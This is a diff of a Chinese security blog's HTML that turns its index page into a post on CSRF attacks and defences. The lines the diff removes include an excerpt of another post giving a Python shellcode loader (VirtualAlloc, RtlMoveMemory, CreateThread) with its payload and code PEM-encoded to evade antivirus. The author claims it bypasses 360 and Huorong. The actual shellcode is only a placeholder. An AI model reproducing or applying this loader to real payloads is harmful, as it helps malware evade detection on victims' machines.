@@ -20,28 +20,33 @@
     var CONFIG = {"hostname":"liaorj.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="LiAo的成长记录">
-<meta property="og:url" content="https://liaorj.github.io/index.html">
+  <meta name="description" content="CSRF定义： 跨站请求伪造 挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法 对比XSS： 跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 123451.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A;2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="重新研究一下CSRF的攻击与防御">
+<meta property="og:url" content="https://liaorj.github.io/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/index.html">
 <meta property="og:site_name" content="LiAo的成长记录">
+<meta property="og:description" content="CSRF定义： 跨站请求伪造 挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法 对比XSS： 跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 123451.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A;2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-14T05:21:45.000Z">
+<meta property="article:modified_time" content="2022-04-14T07:52:31.201Z">
 <meta property="article:author" content="LiAoRJ">
+<meta property="article:tag" content="漏洞研究">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://liaorj.github.io/">
+<link rel="canonical" href="https://liaorj.github.io/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>LiAo的成长记录</title>
+  <title>重新研究一下CSRF的攻击与防御 | LiAo的成长记录</title>
   
 
 
@@ -183,9 +188,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -201,10 +207,9 @@
       <meta itemprop="name" content="LiAo的成长记录">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/" class="post-title-link" itemprop="url">重新研究一下CSRF的攻击与防御</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          重新研究一下CSRF的攻击与防御
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -237,7 +242,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><strong>定义：</strong></p>
+        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><strong>定义：</strong></p>
 <p>跨站请求伪造</p>
 <p>挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p>
 <p><strong>对比XSS：</strong> 跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
@@ -264,217 +269,33 @@
 </ol>
 <p>对于绕过的方法，之后再讲</p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" rel="tag"># 漏洞研究</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="LiAoRJ">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LiAo的成长记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/" class="post-title-link" itemprop="url">SRC姿势(一)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-14 11:34:35 / 修改时间：11:25:22" itemprop="dateCreated datePublished" datetime="2022-04-14T11:34:35+08:00">2022-04-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SRC%E5%A7%BF%E5%8A%BF/" itemprop="url" rel="index"><span itemprop="name">SRC姿势</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="SRC姿势-一"><a href="#SRC姿势-一" class="headerlink" title="SRC姿势(一)"></a>SRC姿势(一)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204141050517.png"></p>
-<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/" rel="prev" title="SRC姿势(一)">
+      <i class="fa fa-chevron-left"></i> SRC姿势(一)
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/04/13/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6%EF%BC%881%EF%BC%89Python%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="LiAoRJ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LiAo的成长记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/13/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6%EF%BC%881%EF%BC%89Python%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86shellcode/" class="post-title-link" itemprop="url">免杀研究（1）Python加密混淆shellcode</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-13 16:34:35 / 修改时间：17:01:45" itemprop="dateCreated datePublished" datetime="2022-04-13T16:34:35+08:00">2022-04-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">免杀研究</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="免杀研究（1）Python加密混淆shellcode"><a href="#免杀研究（1）Python加密混淆shellcode" class="headerlink" title="免杀研究（1）Python加密混淆shellcode"></a>免杀研究（1）Python加密混淆shellcode</h1><p>加密的方式有很多，例如Xor异或，Base64等等，其实加密算法不重要，重要的是一定要加密，本文将使用Python利用PyCrypto库对shellcode进行混淆测试。</p>
-<h2 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h2><p>PyCryptodome 是 PyCrypto 的一个分支。这是一个跟密码学相关的模块，可以实现各种加密方式的加解密。<br><strong>官方文档：</strong><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/introduction.html">https://pycryptodome.readthedocs.io/en/latest/src/introduction.html</a><br><strong>安装</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>
-
-<p><strong>API</strong></p>
-<table>
-<thead>
-<tr>
-<th>Package</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/cipher.html">Crypto.Cipher</a></td>
-<td>用于加密和解密数据（例如：AES）。</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/signature/signature.html">Crypto.Signature</a></td>
-<td>用于创建和验证消息的数字签名  （例如：PKCS#1 v1.5）。</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/hash/hash.html">Crypto.Hash</a></td>
-<td>用于创建加密 <strong>摘要</strong>  （例如：SHA-256）。</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/public_key/public_key.html">Crypto.PublicKey</a></td>
-<td>用于生成、导出或导入的模块  <em>公钥</em> （例如：RSA 或 ECC）。</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/protocol/protocol.html">Crypto.Protocol</a></td>
-<td>促进安全通信的模块 各方之间，在大多数情况下通过利用密码原语 来自其他模块。</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/io/io.html">Crypto.IO</a></td>
-<td>处理常用编码的模块 用于加密数据（例如：PEM）。</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/random/random.html">Crypto.Random</a></td>
-<td>用于生成随机数据的模块。</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="https://pycryptodome.readthedocs.io/en/latest/src/util/util.html">Crypto.Util</a></td>
-<td>通用（例如：XOR for byte 字符串）。</td>
-</tr>
-</tbody></table>
-<h3 id="Crypto-IO-PEM"><a href="#Crypto-IO-PEM" class="headerlink" title="Crypto.IO.PEM"></a>Crypto.IO.PEM</h3><p>根据 PEM 格式封装数据的一组函数。</p>
-<p>PEM（隐私增强邮件）是 IETF 标准，用于通过公钥基础设施保护电子邮件。它在 RFC 1421-1424 中指定。即使它已被放弃，它定义的简单消息封装今天仍然广泛用于将二进制加密对象（如密钥和证书）编码为文本。</p>
-<p><strong>Crypto.IO.PEM.encode &amp; Crypto.IO.PEM.decode</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment"># passphrase：可以指定密钥</span></span><br><span class="line"><span class="comment"># marker：自己指定名称</span></span><br><span class="line">buf = PEM.encode(buf, marker=<span class="string">&quot;shellcode&quot;</span>, passphrase=<span class="literal">None</span>, randfunc=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">PEM.decode(buf, passphrase=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的shellcode</span></span><br><span class="line">buf = <span class="string">&quot;&quot;&quot; &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(PEM.decode(buf, passphrase=<span class="literal">None</span>)[<span class="number">0</span>])</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>执行上线试试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment">#buf = b&quot;&quot;</span></span><br><span class="line"><span class="comment">#passphrase：可以指定密钥</span></span><br><span class="line"><span class="comment">#marker：自己指定名称</span></span><br><span class="line"><span class="comment"># buf = PEM.encode(buf, marker=&quot;shellcode&quot;, passphrase=None, randfunc=None)</span></span><br><span class="line"><span class="comment"># print(buf)</span></span><br><span class="line"><span class="comment">#加密后</span></span><br><span class="line">buf = <span class="string">&quot;&quot;&quot;-----BEGIN shellcode-----</span></span><br><span class="line"><span class="string">XXXXX</span></span><br><span class="line"><span class="string">-----END shellcode-----&quot;&quot;&quot;</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(PEM.decode(buf, passphrase=<span class="literal">None</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#execode加密前</span></span><br><span class="line"><span class="comment"># execode = PEM.encode(b&quot;&quot;&quot;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="comment"># ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="comment"># buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="comment"># ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="comment">#     ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="comment">#     buf,</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;, marker=&quot;execcute code&quot;,</span></span><br><span class="line"><span class="comment">#                  passphrase=None, randfunc=None))</span></span><br><span class="line"><span class="comment">#execode加密后</span></span><br><span class="line">execode=<span class="string">&quot;&quot;&quot;-----BEGIN execcute code-----</span></span><br><span class="line"><span class="string">XXXXX</span></span><br><span class="line"><span class="string">-----END execcute code-----&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(PEM.decode(execode, passphrase=<span class="literal">None</span>)[<span class="number">0</span>].decode())</span><br><span class="line"><span class="built_in">exec</span>(PEM.decode(execode, passphrase=<span class="literal">None</span>)[<span class="number">0</span>].decode())</span><br></pre></td></tr></table></figure>
-
-<p>这里我封装成exe测试下上线，可绕过火绒、360执行命令,如下图。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204131635439.png"></p>
-<p>virustotal查杀率7&#x2F;67 <strong>(测试时间2022年4月13日)</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204131635472.png"></p>
-<p>本文参考自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10999">免杀之代码混淆 - 先知社区 (aliyun.com)</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -527,6 +348,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">1.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E5%9E%8BCSRF"><span class="nav-number">1.1.</span> <span class="nav-text">GET型CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B9%8C%E4%BA%91%E7%A4%BE%E5%8C%BA%E6%9F%90%E5%88%A0%E9%99%A4%E5%8A%9F%E8%83%BD%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E9%9C%80%E8%AF%B1%E9%AA%97%E7%AE%A1%E7%90%86%E5%91%98%E8%A7%A6%E5%8F%91%EF%BC%89"><span class="nav-number">1.1.0.0.1.</span> <span class="nav-text">乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E6%9F%90%E5%A4%84%E5%B0%8F%E5%8A%9F%E8%83%BD%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E6%9F%90%E5%85%83%E7%B4%A0%EF%BC%89"><span class="nav-number">1.1.0.0.2.</span> <span class="nav-text">新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E5%9E%8BCSRF"><span class="nav-number">1.2.</span> <span class="nav-text">POST型CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%94%B5%E8%A7%86%E5%8F%B0%E5%AE%98%E6%96%B9CSRF%E5%88%B7%E5%BE%AE%E5%8D%9A%E7%B2%89"><span class="nav-number">1.2.0.0.1.</span> <span class="nav-text">中国网络电视台官方CSRF刷微博粉</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9Acsrf%E5%88%B7%E7%B2%89%E4%B8%9D"><span class="nav-number">1.2.0.0.2.</span> <span class="nav-text">新浪微博csrf刷粉丝</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E4%B8%80%E7%82%B9%E4%B8%9C%E8%A5%BF"><span class="nav-number">1.3.</span> <span class="nav-text">补充一点东西</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET-CSRF%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">GET CSRF使用方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF%E8%A0%95%E8%99%AB"><span class="nav-number">1.4.</span> <span class="nav-text">CSRF蠕虫</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9F%B3%E6%82%A6%E5%8F%B0%E4%B8%80%E5%A4%84CSRF%EF%BC%882%EF%BC%89-%E5%B7%B2%E7%BB%8F%E8%AF%81%E6%98%8E%E5%8F%AF%E6%9E%84%E9%80%A0%E8%A0%95%E8%99%AB"><span class="nav-number">1.4.0.0.1.</span> <span class="nav-text">音悦台一处CSRF（2）[已经证明可构造蠕虫]</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-CSRF%E7%BB%84%E5%90%88%E6%8B%B3"><span class="nav-number">1.5.</span> <span class="nav-text">XSS+CSRF组合拳</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A3%B9%E5%BF%83%E7%90%86%E5%AD%98%E5%82%A8%E5%9E%8BXSS-CSRF%E9%80%A0%E6%88%90%E8%A0%95%E8%99%AB%E6%94%BB%E5%87%BB"><span class="nav-number">1.5.0.0.1.</span> <span class="nav-text">壹心理存储型XSS+CSRF造成蠕虫攻击</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E4%B8%9A%E7%95%8C%E7%9B%AE%E5%89%8D%E9%98%B2%E5%BE%A1-CSRF-%E6%94%BB%E5%87%BB%E4%B8%BB%E8%A6%81%E6%9C%89%E5%9B%9B%E7%A7%8D%E7%AD%96%E7%95%A5"><span class="nav-number">1.6.</span> <span class="nav-text">在业界目前防御 CSRF 攻击主要有四种策略</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
